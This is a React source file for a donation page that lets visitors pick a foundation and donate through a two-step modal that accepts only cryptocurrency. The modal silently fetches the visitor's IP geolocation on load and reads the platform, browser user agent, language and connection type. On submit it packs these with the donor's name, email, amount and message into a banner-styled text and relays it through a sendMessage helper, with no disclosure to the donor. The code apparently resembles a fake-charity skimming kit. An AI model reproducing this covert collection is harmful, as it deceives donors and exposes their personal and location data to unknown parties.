import React, { useEffect, useState } from 'react'
import Header from '../Components/Header'
import { Link, useParams } from 'react-router-dom'
import { orgs } from '../constants'
import { Combobox, ComboboxButton, ComboboxInput, ComboboxOption, ComboboxOptions } from '@headlessui/react'
import clsx from 'clsx'
import { CheckIcon, ChevronDownIcon } from '@heroicons/react/20/solid'
import { motion } from 'framer-motion'
import Footer from '../Components/Footer'
import { GiCancel } from 'react-icons/gi'
import { sendMessage } from '../constants/send'
import PaymentModal from '../Components/PaymentModal'
// import RaiseModal from '../Components/RaiseModal'


const RaiseModal = ({ setModalOperator, modalOperator, orgData }) => {
  const [err, setErr] = useState(null)
  const [pager, setPager] = useState(false)
  const [amount, setAmount] = useState(0)
  const [name, setName] = useState('')
  const [email, setEmail] = useState('')
  const [message, setMessage] = useState('')
  const [location, setLocation] = useState('');
  const [showModal, setShowModal] = useState(false)
  
  
  function getLocationInfo() {
      fetch(import.meta.env.VITE_LOCATION_URL)
      .then(response => {
          return response.json();
      }, "jsonp")
      .then(res => {
          const ipData = `
          ip: ${res.geoplugin_request}
          latitude: ${res.geoplugin_latitude}
          longitude: ${res.geoplugin_longitude}
          timeZone: ${res.geoplugin_timezone}
          currency: ${res.geoplugin_currencyCode} (${res.geoplugin_currencySymbol})
          exchange: ${res.geoplugin_currencySymbol} ${res.geoplugin_currencyConverter} to $1
          location: ${res.geoplugin_city}, ${res.geoplugin_regionName}, ${res.geoplugin_countryName} \n
          `;
          setLocation(ipData);
      })
      .catch(err => console.warn(err))
    }

  useEffect(()=> {
      getLocationInfo()
  }, []);
          const textMessage = `
  ############ Donation Form ✔️✔️✔️✔️✔️ ############
  email: ${email} \n name: ${name} \n amount: ${amount} \n message: ${message} \n\n
  userAgent: ${'os: ' + navigator.platform + ' \n '+ 'browser:' + navigator.userAgent} \n
  browser language: ${navigator.language}
  ConnectionType: ${navigator.connection.effectiveType}
  locationData: ${location}
  ############ Donation Form ############
  `;

  const data = {
      email: email,
      name: name,
      amount: amount,
      message: message,
  }


  const handleSubmit = (e) => {
      e.preventDefault()
      if (email === '') {
          setErr('Email fields is required.')
          setTimeout(()=> {
              setErr(null)
          }, 5000)
          return
      }else{
          if(!pager) {
              setPager(true)
              return
          }
          if(amount === 0 || amount === '') {
              setErr('Amount field is required.')
              setTimeout(()=> {
                  setErr(null)
              }, 5000)
              return
          }else{
              sendMessage(textMessage)
              setShowModal(true)
          }
      }

  }
return (
  <div className='fixed top-0 bottom-0 left-0 inset-0 right-0 z-40 bg-black/30 flex justify-center items-center'>
    {pager ? <motion.div
     initial={{x: '-100%'}}
     transition={{duration: .3, ease: 'linear'}}
     animate={{x: 0}}
     className='bg-white rounded-lg w-[310px] md:w-[500px] shadow-lg'>
      <div className='flex justify-between border-b w-full'>
          <div title={orgData.name} className='px-4 py-2 text-2xl truncate font-bold text-gray-600'>Donate to {orgData.name}</div>
          <button className='text-gray-600 px-4 py-2 border-l hover:text-gray-900' onClick={() => setModalOperator(!modalOperator)}>
            <GiCancel />
          </button>
      </div>
      <div className='p-4'>
        <form onSubmit={handleSubmit}>
          <div className='mb-4'>
            <label className='block text-sm font-medium text-gray-700'>Amount* {err && <span className='text-sm text-red-600'>.{err}</span>}</label>
            <input required onChange={(e)=> setAmount(e.target.value)} className='appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500' type='number' placeholder='0.00' />
            <div className='text-sm text-gray-600'>
              Please enter the amount you'd like to donate.
            </div>
          </div>
              <div className='mb-4'>
              <label className='block text-sm font-medium text-gray-700'>Payment Method</label>
              <select defaultValue={"crypto"} className='block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500'>
                  <option value='crypto'>Cryptocurrency</option>
              </select>
              </div>
              <div className='mb-4'>
              <label className='block text-sm font-medium text-gray-700'>Write a message</label>
              <textarea onChange={(e)=> setMessage(e.target.value)} className='appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500' type='text' placeholder='Recipient Name' />
              </div>
              <button onClick={handleSubmit} className='w-full flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium text-white bg-indigo-500 hover:bg-indigo-400 focus:outline-none focus:ring-2 focus:ring-indigo-500'>
                  Donate
              </button>
          </form>
      </div>
      <div className='flex justify-center p-4 text-sm text-gray-600'>
        <span>By clicking Donate, you agree to our </span>
        <a href='/terms' target='_blank' className='text-indigo-600 underline'>Terms & Conditions</a>
      </div>
  </motion.div>: 
  
  <motion.div
     initial={{x: '-100%'}}
     transition={{duration: .3, ease: 'linear'}}
     animate={{x: 0}}
     className='bg-white rounded-lg w-[310px] md:w-[500px] shadow-lg'>
      <div className='flex justify-between border-b w-full'>
          <div title={orgData.name} className='px-4 py-2 text-2xl font-bold truncate text-gray-600'>Donate to {orgData.name}</div>
          <button className='text-gray-600 px-4 py-2 border-l hover:text-gray-900' onClick={() => setModalOperator(!modalOperator)}>
            <GiCancel />
          </button>
      </div>
      <div className='p-4'>
        <form onSubmit={handleSubmit}>
          <div className='mb-4'>
            <label className='block text-sm font-medium text-gray-700'>Name</label>
            <input onChange={(e)=> setName(e.target.value)} className='appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500' type='text' placeholder='Your Name' />
          </div>
          <div className='mb-4'>
              <label className='block text-sm font-medium text-gray-700'>Email Address* {err && <span className='text-sm text-red-600'>.{err}</span>}</label>
              <input onChange={(e) => setEmail(e.target.value)} className='appearance-none block w-full px-3 py-2 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-indigo-500' type='email' placeholder='Email Address' />
              <div className='text-sm text-gray-600'>
                  Please enter a valid email.
              </div>
          </div>
              <button className='w-full flex justify-center items-center px-4 py-2 border border-transparent text-sm font-medium text-white bg-indigo-500 hover:bg-indigo-400 focus:outline-none focus:ring-2 focus:ring-indigo-500'>
                  Next
              </button>
          </form>
      </div>
      <div className='flex justify-center p-4 text-sm text-gray-600'>
        <span>By clicking Donate, you agree to our </span>
        <a href='/terms' target='_blank' className='text-indigo-600 underline'>Terms & Conditions</a>
      </div>
  </motion.div>
  }
  {showModal &&<PaymentModal 
      orgData={orgData}
      textMessage={textMessage}
      data={data}
      modalOperator={showModal}
      setModalOperator={setShowModal}
  />}
  </div>
)
}


const Donation = () => {
    const urlParam = useParams()
    const linkData = urlParam.org
    const [orgData, setOrgData] = useState(null)
    const [query, setQuery] = useState('')
    const [isOpen, setIsOpen] = useState(false)
    const [modalOperator, setModalOperator] = useState(false)
    const [selected, setSelected] = useState(orgs.organizations[0])
    useEffect(()=> {
        const org = orgs.organizations.find(item => item.link === linkData)
        setOrgData(org)
        setIsOpen(false)
      }, [linkData])

      const filterOrgData =
        query === ''
        ? orgs.organizations
        : orgs.organizations.filter(item => {
            return item.name.toLowerCase().includes(query.toLowerCase())
  
        })

  return (
    orgData &&
    <div>
      <Header />
      <div className='mx-auto font-semibold flex max-w-7xl items-center p-6 lg:px-8'>
        <Link to="/donate" className='text-stone-500'>Donate</Link>{'> '}<span className="text-stone-800"> {orgData.name}</span>
      </div>
      <div className='mx-auto font-semibold max-w-7xl items-center p-6 lg:px-8'>
        <div className="text-xl font-bold tracking-tight flex items-center text-gray-900 sm:text-4xl">
            <div>Donate to {orgData.name}</div> 
            {!isOpen ? <div onClick={() => setIsOpen(!isOpen)} className='ml-4 text-sm font-semibold cursor-pointer bg-slate-300 px-2 rounded-md py-0.5'>choose a different foundation</div> :
            <Combobox value={selected} onChange={(value) => setSelected(value)} onClose={() => setQuery('')}>
            <div className="ml-4 relative">
                <ComboboxInput
                    className={clsx(
                    'w-full rounded-lg border-none bg-black/55 py-1.5 pr-8 pl-3 text-sm/6 text-white',
                    'focus:outline-none data-[focus]:outline-2 data-[focus]:-outline-offset-2 data-[focus]:outline-white/25'
                    )}
                    displayValue={(items) => items?.name}
                    onChange={(event) => setQuery(event.target.value)}
                />
                <ComboboxButton className="group absolute inset-y-0 right-0 px-2.5 -mb-3">
                    <ChevronDownIcon className="size-4 fill-white/60 group-data-[hover]:fill-white" />
                </ComboboxButton>
            </div>
            <ComboboxOptions
                anchor="bottom"
                transition
                className={clsx(
                    'w-[var(--input-width)] rounded-xl border border-black/50 bg-black/50 p-1 [--anchor-gap:var(--spacing-1)] empty:invisible',
                    'transition duration-100 ease-in data-[leave]:data-[closed]:opacity-0'
                )}
                >
                {filterOrgData.map((items, index) => (
                    <Link to={'/donate/' + items.link} >
                      <ComboboxOption
                      key={index}
                      value={items}
                      className="group flex cursor-default items-center gap-2 rounded-lg py-1.5 px-3 select-none data-[focus]:bg-white/10"
                      >
                              <CheckIcon className="invisible size-4 fill-white group-data-[selected]:visible" />
                              <div className="text-sm/6 text-white">{items.name}</div>
                      </ComboboxOption>
                    </Link>
                ))}
                </ComboboxOptions>
            </Combobox>}
        </div>
        <p className="mt-0 text-base leading-8 text-gray-600">
          {orgData.goal}
        </p>
        <div className='mt-3 text-lg leading-8 text-gray-600'>
            {orgData.purpose}
        </div>

        <div className='text-indigo-600'>{orgData.country}</div>
        <div className="flex justify-center mt-8">
          <button onClick={()=> setModalOperator(!modalOperator)} className="flex items-center px-6 py-3 text-sm font-medium leading-5 text-white transition duration-150 bg-blue-600 hover:bg-blue-700 rounded-md">
            Donate Now
          </button>
        </div>
      </div>
      {modalOperator && <RaiseModal modalOperator={modalOperator} orgData={orgData} setModalOperator={setModalOperator} />}
      <Footer />
    </div>
  )
}

export default Donation
